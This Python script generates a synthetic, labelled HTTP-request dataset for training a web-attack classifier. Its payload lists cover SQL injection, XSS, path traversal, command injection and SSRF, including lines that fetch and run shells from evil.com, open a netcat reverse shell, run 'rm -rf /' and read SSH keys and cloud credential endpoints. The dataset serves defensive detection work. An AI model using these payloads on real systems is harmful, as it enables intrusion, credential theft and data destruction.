"""
V3 Synthetic Dataset Generator — 100K samples with 50+ payload templates per class.

Classes:
  0 = Normal
  1 = SQLi
  2 = XSS
  3 = Path Traversal
  4 = Command Injection
  5 = SSRF (NEW)
"""
import random
import numpy as np
import pandas as pd
import sys
import os

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from utils.feature_extraction import extract_features

random.seed(42)
np.random.seed(42)


# ─────────────────────────────────────────────────────────────────────────
# USER AGENT POOL
# ─────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'curl/8.4.0', 'PostmanRuntime/7.36.0', 'Python-urllib/3.12',
    'axios/1.6.2', 'Go-http-client/2.0', 'okhttp/4.12.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
]

def _random_headers(method='GET', with_body=False):
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': random.choice(['*/*', 'application/json', 'text/html'])}
    if with_body or method == 'POST':
        headers['Content-Type'] = random.choice(['application/json', 'application/x-www-form-urlencoded'])
    if random.random() < 0.3:
        headers['X-Request-ID'] = f'{random.randint(10000,99999)}'
    if random.random() < 0.2:
        headers['Authorization'] = f'Bearer {"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=random.randint(40,120)))}'
    return headers


# ─────────────────────────────────────────────────────────────────────────
# NORMAL TRAFFIC
# ─────────────────────────────────────────────────────────────────────────
_NORMAL_PATHS = [
    '/api/products', '/api/products/{id}', '/api/users', '/api/users/me',
    '/api/search', '/api/checkout', '/api/cart', '/api/cart/items',
    '/api/orders', '/api/orders/{id}', '/api/reviews', '/api/reviews/{id}',
    '/api/categories', '/api/categories/{id}/products', '/api/wishlist',
    '/api/auth/login', '/api/auth/register', '/api/auth/refresh',
    '/api/v2/products', '/api/v2/users/profile', '/api/v2/analytics',
    '/api/health', '/api/status', '/api/config/public',
    '/api/notifications', '/api/notifications/mark-read',
    '/api/payments/methods', '/api/shipping/rates',
    '/api/images/upload', '/api/files/documents',
    '/graphql', '/api/webhooks/stripe', '/api/webhooks/github',
]

def generate_normal(is_ambiguous=False):
    method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    headers = _random_headers(method)
    url, body = '', ''

    if not is_ambiguous:
        path = random.choice(_NORMAL_PATHS).replace('{id}', str(random.randint(1, 9999)))
        noise = random.choice(['special', 'encoded', 'long_query', 'html_like', 'graphql',
                                'pagination', 'filter', 'oauth', 'webhook', 'none', 'none', 'none'])

        if method in ('GET', 'DELETE', 'HEAD'):
            if noise == 'special':
                url = f"{path}?q=O'Brien's+Widgets&sort=price"
            elif noise == 'encoded':
                url = f"{path}?q=shoes%26bags&ref=home%23section"
            elif noise == 'long_query':
                url = f"{path}?category=electronics&brand=samsung&model=galaxy+s24&color=black&size=128gb&page=2&limit=50"
            elif noise == 'pagination':
                url = f"{path}?page={random.randint(1,100)}&limit={random.choice([10,20,50,100])}&sort={random.choice(['price','name','date'])}&order={random.choice(['asc','desc'])}"
            elif noise == 'filter':
                url = f"{path}?min_price={random.randint(10,100)}&max_price={random.randint(200,5000)}&in_stock=true&rating_gte=4"
            else:
                url = f"{path}?id={random.randint(1, 10000)}"
        else:
            url = path
            if noise == 'html_like':
                body = '{"review": "<b>great product!</b> Highly <em>recommended</em>"}'
            elif noise == 'graphql':
                body = '{"query": "{ products(first: 10) { edges { node { id name price } } } }"}'
            elif noise == 'oauth':
                body = f'{{"grant_type": "authorization_code", "code": "{"".join(random.choices("abcdefghijklmnop0123456789", k=32))}", "redirect_uri": "https://app.example.com/callback"}}'
            elif noise == 'webhook':
                body = f'{{"event": "payment.completed", "data": {{"id": "pay_{random.randint(10000,99999)}", "amount": {random.randint(100,99999)}}}}}'
            else:
                body = '{"id": ' + str(random.randint(1, 10000)) + ', "quantity": ' + str(random.randint(1, 10)) + '}'
    else:
        # Borderline / ambiguous cases that look suspicious but are legit
        ambiguous_cases = [
            ('/api/debug?query=SELECT+count+FROM+products', '', 'GET'),
            ('/api/search?q=how+to+prevent+SQL+injection+attacks', '', 'GET'),
            ('/api/products?name=Script+Runner+Pro+v2.0', '', 'GET'),
            ('/api/files?path=docs/reports/2024/q1.pdf', '', 'GET'),
            ('/api/reviews', '{"text": "Great tutorial on using <code>alert()</code> in JavaScript"}', 'POST'),
            ('/api/search?q=SELECT+statement+tutorial+for+beginners', '', 'GET'),
            ('/api/products?name=DROP+Table+Lamp&brand=IKEA', '', 'GET'),
            ('/api/search?q=union+jack+flag+history', '', 'GET'),
            ('/api/blog?title=How+to+use+pipes+in+Unix', '', 'GET'),
            ('/api/comments', '{"text": "Use document.querySelector() to select elements"}', 'POST'),
            ('/api/analytics?path=/etc/config&env=production', '', 'GET'),
            ('/api/search?q=localhost+development+setup', '', 'GET'),
            ('/api/docs?section=../architecture/overview', '', 'GET'),
            ('/api/search?q=eval()+is+evil+best+practices', '', 'GET'),
            ('/api/code-snippets', '{"code": "for i in range(10): print(f\\"{i}\\")"}', 'POST'),
        ]
        url, body, method = random.choice(ambiguous_cases)

    headers = _random_headers(method, bool(body))
    return url, method, body, headers, 0


# ─────────────────────────────────────────────────────────────────────────
# SQLi (50+ templates)
# ─────────────────────────────────────────────────────────────────────────
_SQLI_PAYLOADS_OBVIOUS = [
    "' OR 1=1 --", "' OR '1'='1", '" OR "1"="1', "' OR 1=1#",
    "' UNION SELECT * FROM users --", "' UNION SELECT username,password FROM users --",
    "1; DROP TABLE users --", "'; DELETE FROM products WHERE 1=1 --",
    "' OR 'x'='x", "1' AND 1=1 --", "admin'--", "1 OR 1=1",
    "' UNION ALL SELECT NULL,NULL,NULL --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "'; EXEC xp_cmdshell('whoami') --",
    "' HAVING 1=1 --", "' GROUP BY 1 --",
    "1' ORDER BY 1,2,3,4,5,6,7,8 --",
    "'; INSERT INTO users VALUES('hacker','pass') --",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
]

_SQLI_PAYLOADS_SUBTLE = [
    "' oR 1=1 --", "' UnIoN SeLeCt", "'/**/OR/**/1=1--",
    "%2527%2520OR%25201%253D1", "'OR'1'='1", "admin'||'",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3 --",
    "' AND SLEEP(5) --", "' AND BENCHMARK(10000000,SHA1('test')) --",
    "' WAITFOR DELAY '0:0:5' --",
    "1'%09or%091=1%09--", "' or ''='",
    "')/**/or/**/1=1--", "' AnD 1=1 --",
    "'||pg_sleep(5)--", "1;SELECT+IF(1=1,SLEEP(5),0)--",
    "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "0x27206f7220313d31202d2d",  # hex encoded ' or 1=1 --
    "'-IF(1=1,SLEEP(5),0)--", "';DECLARE @x NVARCHAR(999);--",
    "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1) --",
    "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
]

_SQLI_TARGETS = [
    ('/api/users?id=', '', 'GET'),
    ('/api/products?search=', '', 'GET'),
    ('/api/login', 'username', 'POST'),
    ('/api/search?q=', '', 'GET'),
    ('/api/orders?filter=', '', 'GET'),
    ('/api/auth/login', 'email', 'POST'),
    ('/api/reviews?sort=', '', 'GET'),
    ('/api/categories?name=', '', 'GET'),
]

def generate_sqli(is_subtle=False):
    payload = random.choice(_SQLI_PAYLOADS_SUBTLE if is_subtle else _SQLI_PAYLOADS_OBVIOUS)
    target = random.choice(_SQLI_TARGETS)
    path, field, method = target
    headers = _random_headers(method)

    if method == 'GET':
        url = f"{path}{payload}"
        body = ""
    else:
        url = path
        body = f'{{"{field}": "{payload}", "password": "password123"}}'
    return url, method, body, headers, 1


# ─────────────────────────────────────────────────────────────────────────
# XSS (50+ templates)
# ─────────────────────────────────────────────────────────────────────────
_XSS_PAYLOADS_OBVIOUS = [
    '<script>alert(1)</script>', '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>', '<img onerror=alert(1) src=x>',
    '<body onload=alert(1)>', '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">', '<a href="javascript:alert(1)">click</a>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
]

_XSS_PAYLOADS_SUBTLE = [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<div onmouseover="alert(1)">',
    '<svg/onload=alert(1)>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    "{{constructor.constructor('alert(1)')()}}",
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M1">',
    'javascript:/*-->*/alert(1)',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    '<style>@import "javascript:alert(1)";</style>',
    '<link rel=stylesheet href="javascript:alert(1)">',
    '<form action="javascript:alert(1)"><input type=submit>',
    '"><img/src/onerror=alert(1)>',
    '<isindex action=javascript:alert(1) type=image>',
    "';alert(1)//", '"-alert(1)-"', '<xss id=x onfocus=alert(1) tabindex=1>',
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
]

_XSS_TARGETS = [
    ('/api/search?q=', '', 'GET'),
    ('/api/comments', 'comment', 'POST'),
    ('/api/reviews', 'text', 'POST'),
    ('/api/profile', 'bio', 'POST'),
    ('/api/messages', 'content', 'POST'),
    ('/api/feedback', 'message', 'POST'),
]

def generate_xss(is_subtle=False):
    payload = random.choice(_XSS_PAYLOADS_SUBTLE if is_subtle else _XSS_PAYLOADS_OBVIOUS)
    target = random.choice(_XSS_TARGETS)
    path, field, method = target
    headers = _random_headers(method)

    if method == 'GET':
        url = f"{path}{payload}"
        body = ""
    else:
        url = path
        body = f'{{"{field}": "{payload}"}}'
    return url, method, body, headers, 2


# ─────────────────────────────────────────────────────────────────────────
# PATH TRAVERSAL (30+ templates)
# ─────────────────────────────────────────────────────────────────────────
_PT_PAYLOADS_OBVIOUS = [
    '../../etc/passwd', '../../../etc/shadow',
    '..\\..\\windows\\win.ini', '../../etc/hosts',
    '../../../proc/self/environ', '../../var/log/auth.log',
    '../../../../etc/nginx/nginx.conf',
    '../../../usr/local/etc/php.ini',
    '../../root/.ssh/id_rsa', '../../root/.bash_history',
]

_PT_PAYLOADS_SUBTLE = [
    '....//....//etc/passwd', '..%252f..%252f',
    '..%c0%af..%c0%af', '..%255c..%255c',
    '..%2f..%2f..%2fetc%2fpasswd',
    '....\\\\....\\\\etc\\\\passwd',
    '..\\..\\..\\..\\..',
    '..%00/..%00/etc/passwd',
    '....//....//....//etc/shadow',
    '/var/www/../../etc/passwd',
    '..;/..;/..;/etc/passwd',
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '\\..\\..\\..\\..',
    'file:///etc/passwd',
    '/..%c0%af..%c0%af..%c0%afetc/passwd',
]

_PT_TARGETS = [
    '/api/download?file=', '/api/files?path=',
    '/api/export?template=', '/api/images?src=',
    '/api/static?resource=', '/api/include?page=',
    '/api/docs?file=',
]

def generate_path_traversal(is_subtle=False):
    payload = random.choice(_PT_PAYLOADS_SUBTLE if is_subtle else _PT_PAYLOADS_OBVIOUS)
    target = random.choice(_PT_TARGETS)
    headers = _random_headers('GET')
    url = f"{target}{payload}"
    return url, 'GET', '', headers, 3


# ─────────────────────────────────────────────────────────────────────────
# COMMAND INJECTION (30+ templates)
# ─────────────────────────────────────────────────────────────────────────
_CI_PAYLOADS_OBVIOUS = [
    '; ls -la', '| cat /etc/passwd', '& whoami',
    '; id', '| uname -a', '; cat /etc/shadow',
    '&& curl http://evil.com/shell.sh | sh',
    '; wget http://evil.com/backdoor',
    '| nc -e /bin/sh 10.0.0.1 4444',
    '; rm -rf /', '&& echo pwned',
    '; python -c "import os;os.system(\'id\')"',
]

_CI_PAYLOADS_SUBTLE = [
    '%0als', '$(echo whoami)', '`id`',
    '%0a%0did', '$(cat${IFS}/etc/passwd)',
    '|{cat,/etc/passwd}',
    ';{ls,-la}', '$((1+1))', '`uname${IFS}-a`',
    '%0A/usr/bin/id', '$(printf "\\x69\\x64")',
    '\n/bin/cat /etc/passwd',
    '|rev<<<"dwssap/cte/ tac"',
    "$({ls,-la})", '`echo${IFS}test`',
    ';echo${IFS}"test"', '|bash${IFS}-i',
    '$(python3${IFS}-c${IFS}"print(1)")',
    '`curl${IFS}http://evil.com`',
]

_CI_TARGETS_GET = [
    '/api/ping?ip=127.0.0.1', '/api/tools/dns?host=example.com',
    '/api/tools/traceroute?target=8.8.8.8',
    '/api/system/info?cmd=status', '/api/tools/nslookup?domain=test.com',
]
_CI_TARGETS_POST = [
    ('/api/tools/ping', 'target'), ('/api/tools/exec', 'command'),
    ('/api/system/diag', 'host'), ('/api/tools/curl', 'url'),
]

def generate_cmd_injection(is_subtle=False):
    payload = random.choice(_CI_PAYLOADS_SUBTLE if is_subtle else _CI_PAYLOADS_OBVIOUS)
    method = random.choice(['GET', 'POST'])
    headers = _random_headers(method)

    if method == 'GET':
        base = random.choice(_CI_TARGETS_GET)
        url = f"{base}{payload}"
        body = ""
    else:
        path, field = random.choice(_CI_TARGETS_POST)
        url = path
        body = f'{{"{field}": "127.0.0.1{payload}"}}'
    return url, method, body, headers, 4


# ─────────────────────────────────────────────────────────────────────────
# SSRF (NEW class — 30+ templates)
# ─────────────────────────────────────────────────────────────────────────
_SSRF_PAYLOADS_OBVIOUS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://127.0.0.1:22', 'http://localhost:8080/admin',
    'http://0.0.0.0:6379/', 'http://127.0.0.1:3306/',
    'http://192.168.1.1/admin', 'http://10.0.0.1/config',
    'http://172.16.0.1/internal', 'gopher://127.0.0.1:25/',
    'dict://127.0.0.1:11211/stat',
    'ftp://127.0.0.1/etc/passwd',
]

_SSRF_PAYLOADS_SUBTLE = [
    'http://[::1]:8080/', 'http://0x7f000001/',
    'http://2130706433/',  # decimal IP for 127.0.0.1
    'http://0177.0.0.1/', # octal
    'http://127.1/', 'http://localtest.me/',
    'http://spoofed.burpcollaborator.net/',
    'http://169.254.169.254.xip.io/',
    'http://metadata.google.internal%2F',
    'http://[0:0:0:0:0:ffff:127.0.0.1]/',
    'https://evil.com@169.254.169.254/',
    'http://127.0.0.1:8080/../../admin',
    'http://127.0.0.1%2523@evil.com/',
    'jar:http://127.0.0.1!/test',
    'http://127.0.0.1#@evil.com/',
]

_SSRF_TARGETS = [
    ('/api/fetch?url=', '', 'GET'),
    ('/api/proxy?target=', '', 'GET'),
    ('/api/webhook/test', 'callback_url', 'POST'),
    ('/api/import', 'source_url', 'POST'),
    ('/api/preview?link=', '', 'GET'),
    ('/api/avatar/upload', 'image_url', 'POST'),
    ('/api/pdf/generate', 'template_url', 'POST'),
]

def generate_ssrf(is_subtle=False):
    payload = random.choice(_SSRF_PAYLOADS_SUBTLE if is_subtle else _SSRF_PAYLOADS_OBVIOUS)
    target = random.choice(_SSRF_TARGETS)
    path, field, method = target
    headers = _random_headers(method)

    if method == 'GET':
        url = f"{path}{payload}"
        body = ""
    else:
        url = path
        body = f'{{"{field}": "{payload}"}}'
    return url, method, body, headers, 5


# ─────────────────────────────────────────────────────────────────────────
# MAIN GENERATOR
# ─────────────────────────────────────────────────────────────────────────
def main():
    total_samples = 100000

    # Distribution:  Normal 40%, Ambiguous 8%, SQLi 12%, XSS 12%,
    #                PathTraversal 10%, CmdInj 10%, SSRF 8%
    n_normal    = int(total_samples * 0.40)
    n_ambiguous = int(total_samples * 0.08)
    n_sqli      = int(total_samples * 0.12)
    n_xss       = int(total_samples * 0.12)
    n_pt        = int(total_samples * 0.10)
    n_ci        = int(total_samples * 0.10)
    n_ssrf      = int(total_samples * 0.08)

    stats = {
        'labels': {0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0},
        'subtle_attacks': 0, 'obvious_attacks': 0
    }

    requests_to_generate = []
    for _ in range(n_normal):    requests_to_generate.append(('normal', False))
    for _ in range(n_ambiguous): requests_to_generate.append(('normal', True))
    for _ in range(n_sqli):      requests_to_generate.append(('sqli',   random.choice([True, False])))
    for _ in range(n_xss):       requests_to_generate.append(('xss',    random.choice([True, False])))
    for _ in range(n_pt):        requests_to_generate.append(('pt',     random.choice([True, False])))
    for _ in range(n_ci):        requests_to_generate.append(('ci',     random.choice([True, False])))
    for _ in range(n_ssrf):      requests_to_generate.append(('ssrf',   random.choice([True, False])))

    random.shuffle(requests_to_generate)

    data = []
    generators = {
        'normal': generate_normal,
        'sqli':   generate_sqli,
        'xss':    generate_xss,
        'pt':     generate_path_traversal,
        'ci':     generate_cmd_injection,
        'ssrf':   generate_ssrf,
    }

    for i, (req_type, is_subtle) in enumerate(requests_to_generate):
        gen = generators[req_type]
        if req_type == 'normal':
            url, method, body, headers, label = gen(is_subtle)
            is_attack_subtle = False
        else:
            url, method, body, headers, label = gen(is_subtle)
            is_attack_subtle = is_subtle

        stats['labels'][label] += 1
        if label > 0:
            if is_attack_subtle:
                stats['subtle_attacks'] += 1
            else:
                stats['obvious_attacks'] += 1

        features = extract_features(url, method, body, headers)
        features['label'] = label
        data.append(features)

        if (i + 1) % 10000 == 0:
            print(f"  Generated {i+1}/{total_samples} samples...")

    df = pd.DataFrame(data)
    output_path = os.path.join(current_dir, 'synthetic_v3_dataset.csv')
    df.to_csv(output_path, index=False)

    print(f"\nGenerated {len(df)} samples → {output_path}")
    print(f"Features per sample: {len(df.columns) - 1}")
    print("\nClass Distribution:")
    label_names = {0: 'Normal', 1: 'SQLi', 2: 'XSS', 3: 'PathTraversal', 4: 'CmdInjection', 5: 'SSRF'}
    for lbl, name in label_names.items():
        print(f"  {lbl} ({name}): {stats['labels'][lbl]}")
    print(f"\nAttacks: {stats['subtle_attacks']} subtle, {stats['obvious_attacks']} obvious")


if __name__ == '__main__':
    main()
